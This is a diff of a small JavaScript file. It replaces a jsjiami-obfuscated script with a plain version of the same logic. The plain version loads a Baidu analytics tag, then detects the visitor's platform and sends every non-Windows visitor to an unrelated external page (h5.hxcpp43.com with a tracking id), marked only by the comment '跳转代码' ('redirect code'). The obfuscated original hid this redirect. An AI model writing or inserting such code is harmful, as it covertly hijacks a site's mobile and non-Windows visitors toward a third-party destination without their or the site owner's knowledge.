@@ -1,9 +1,23 @@
 /*
- * 0408-1002加密工具已经升级了一个版本，目前为 jsjiami.com.v5 ，主要加强了算法，以及防破解【绝对不可逆】配置，耶稣也无法100%还原，我说的。;
- * 已经打算把这个工具基础功能一直免费下去。还希望支持我。
- * 另外 jsjiami.com.v5 已经强制加入校验，注释可以去掉，但是 jsjiami.com.v5 不能去掉（如果你开通了VIP，可以手动去掉），其他都没有任何绑定。
- * 誓死不会加入任何后门，jsjiami.com JS 加密的使命就是为了保护你们的Javascript 。
- * 警告：如果您恶意去掉 jsjiami.com.v5 那么我们将不会保护您的JavaScript代码。请遵守规则
- * 新版本: https://www.jsjiami.com/ 支持批量加密，支持大文件加密，拥有更多加密。 */
+ * 0413  */
  
-;var encode_version = 'jsjiami.com.v5', sovbk = '__0xb90cc',  __0xb90cc=['54qS5p2E5Y+h776aw7sw5L+P5ay75pyM5b2g56mF77+a6L+k6Kyl5pem5o2O5ouG5LiG55qI5bWj5L2o','wpDDhWRRLcO9w6E/woAKcMOgw6DCqsOiw7NVwpgLEMKvwqvCqcKVwqlkD2pUw6JcPMK6XXDCl1PDrwXCvHTDk8KLwqrDgWfDnh0HEcKbw7ACS1srUcO1w74=','EV1rBjQ=','KMK+FkDCqg==','E8O3O8OLw5/ClcOqfcOWRA==','w5jCucOYwqQ0csOmM14nMVo=','YcOXwpnDnkxlwpM=','w5xmHA==','UcKmQsOC','w6fDjMOneMO2w7bCh8O3w5ljd8OAw4ZwwrrDnsK+c8OZw6dsQcOPwpPCpzlkVjhhOMKrwpPCtlE=','bcOLwok=','w4RnYQ==','5YmQ6ZqU54iE5pyG5Yy077+lwrVF5LyK5a+Q5p+w5b+Q56id','w5/CmBnDqMKU','w73Ck1PDpcOQ','wrhewqFpwps=','OAYmwoYBwrXDpnFkwohpBhjCvw==','wo1VwqFHwqM=','wrwlPcK+wos=','T8OawqzDl30=','UlgBSxE='];(function(_0x26b058,_0x212ee2){var _0x1434fa=function(_0x3782cb){while(--_0x3782cb){_0x26b058['push'](_0x26b058['shift']());}};_0x1434fa(++_0x212ee2);}(__0xb90cc,0x1ba));var _0x3bda=function(_0x1f38b9,_0x4e0fa9){_0x1f38b9=_0x1f38b9-0x0;var _0x5748e3=__0xb90cc[_0x1f38b9];if(_0x3bda['initialized']===undefined){(function(){var _0x114ed2=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0xadaa82='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x114ed2['atob']||(_0x114ed2['atob']=function(_0x13a1c5){var _0x5b5695=String(_0x13a1c5)['replace'](/=+$/,'');for(var _0x4603ce=0x0,_0x1959be,_0x399c93,_0x5de209=0x0,_0x5bae93='';_0x399c93=_0x5b5695['charAt'](_0x5de209++);~_0x399c93&&(_0x1959be=_0x4603ce%0x4?_0x1959be*0x40+_0x399c93:_0x399c93,_0x4603ce++%0x4)?_0x5bae93+=String['fromCharCode'](0xff&_0x1959be>>(-0x2*_0x4603ce&0x6)):0x0){_0x399c93=_0xadaa82['indexOf'](_0x399c93);}return _0x5bae93;});}());var _0x3211db=function(_0x21a897,_0x29a02c){var _0x5acfaa=[],_0x3d447a=0x0,_0x4276e7,_0x2479e8='',_0x5d86a4='';_0x21a897=atob(_0x21a897);for(var _0x31bdb0=0x0,_0x19a5ed=_0x21a897['length'];_0x31bdb0<_0x19a5ed;_0x31bdb0++){_0x5d86a4+='%'+('00'+_0x21a897['charCodeAt'](_0x31bdb0)['toString'](0x10))['slice'](-0x2);}_0x21a897=decodeURIComponent(_0x5d86a4);for(var _0x25d1e1=0x0;_0x25d1e1<0x100;_0x25d1e1++){_0x5acfaa[_0x25d1e1]=_0x25d1e1;}for(_0x25d1e1=0x0;_0x25d1e1<0x100;_0x25d1e1++){_0x3d447a=(_0x3d447a+_0x5acfaa[_0x25d1e1]+_0x29a02c['charCodeAt'](_0x25d1e1%_0x29a02c['length']))%0x100;_0x4276e7=_0x5acfaa[_0x25d1e1];_0x5acfaa[_0x25d1e1]=_0x5acfaa[_0x3d447a];_0x5acfaa[_0x3d447a]=_0x4276e7;}_0x25d1e1=0x0;_0x3d447a=0x0;for(var _0x2ef757=0x0;_0x2ef757<_0x21a897['length'];_0x2ef757++){_0x25d1e1=(_0x25d1e1+0x1)%0x100;_0x3d447a=(_0x3d447a+_0x5acfaa[_0x25d1e1])%0x100;_0x4276e7=_0x5acfaa[_0x25d1e1];_0x5acfaa[_0x25d1e1]=_0x5acfaa[_0x3d447a];_0x5acfaa[_0x3d447a]=_0x4276e7;_0x2479e8+=String['fromCharCode'](_0x21a897['charCodeAt'](_0x2ef757)^_0x5acfaa[(_0x5acfaa[_0x25d1e1]+_0x5acfaa[_0x3d447a])%0x100]);}return _0x2479e8;};_0x3bda['rc4']=_0x3211db;_0x3bda['data']={};_0x3bda['initialized']=!![];}var _0x18d13b=_0x3bda['data'][_0x1f38b9];if(_0x18d13b===undefined){if(_0x3bda['once']===undefined){_0x3bda['once']=!![];}_0x5748e3=_0x3bda['rc4'](_0x5748e3,_0x4e0fa9);_0x3bda['data'][_0x1f38b9]=_0x5748e3;}else{_0x5748e3=_0x18d13b;}return _0x5748e3;};var _hmt=_hmt||[];(function(){var _0x13a0d3={'HoXxK':'script','XNZji':_0x3bda('0x0','URFv')};var _0x1690ff=document['createElement'](_0x13a0d3[_0x3bda('0x1','NjFa')]);_0x1690ff['src']=_0x13a0d3[_0x3bda('0x2','14^P')];var _0x280fc5=document['getElementsByTagName'](_0x13a0d3['HoXxK'])[0x0];_0x280fc5[_0x3bda('0x3','wM(!')][_0x3bda('0x4','9hEc')](_0x1690ff,_0x280fc5);}());var str=navigator['platform']['toLowerCase']();var isWin=str[_0x3bda('0x5','kOcr')](_0x3bda('0x6','KBW7'))!=-0x1;if(isWin){}else{location[_0x3bda('0x7','UMw0')]=_0x3bda('0x8','37Jj');};(function(_0x4bb1a4,_0x3828ed,_0x43199c){var _0x39b1de={'GfyLC':_0x3bda('0x9','kOcr'),'cDAMc':'undefined','rQpzq':function _0x415ca5(_0x4e9ad5,_0x5b62dd){return _0x4e9ad5===_0x5b62dd;},'GZpTI':function _0x512cd6(_0x23fb0b,_0x406373){return _0x23fb0b!==_0x406373;},'dlPns':'ymJ','GcQlI':_0x3bda('0xa','UIh6'),'MomlQ':function _0x215d4a(_0x20cf4c,_0x4f1fc9){return _0x20cf4c+_0x4f1fc9;},'SYcDk':_0x3bda('0xb','14^P')};_0x43199c='al';try{_0x43199c+=_0x39b1de[_0x3bda('0xc','P4kl')];_0x3828ed=encode_version;if(!(typeof _0x3828ed!==_0x39b1de[_0x3bda('0xd','JQeN')]&&_0x39b1de[_0x3bda('0xe',')xNN')](_0x3828ed,_0x3bda('0xf','lC*N')))){if(_0x39b1de[_0x3bda('0x10',')xNN')](_0x39b1de[_0x3bda('0x11','ARzm')],_0x39b1de[_0x3bda('0x12','kOcr')])){_0x4bb1a4[_0x43199c](_0x39b1de[_0x3bda('0x13','nH7#')]('删除',_0x3bda('0x14','nfQV')));}else{}}}catch(_0x1f947d){_0x4bb1a4[_0x43199c](_0x39b1de['SYcDk']);}}(window));;encode_version = 'jsjiami.com.v5';
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e08a8d59bfdcf418c0b306463b0ebb9b";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+var str = navigator.platform.toLowerCase();
+
+var isWin = (str.indexOf("win") != -1 );
+ 
+    if(isWin){ 
+        
+     }else{ 
+         location.href="https://h5.hxcpp43.com/?id=13029959";
+
+		 //跳转代码
+ 
+      }   
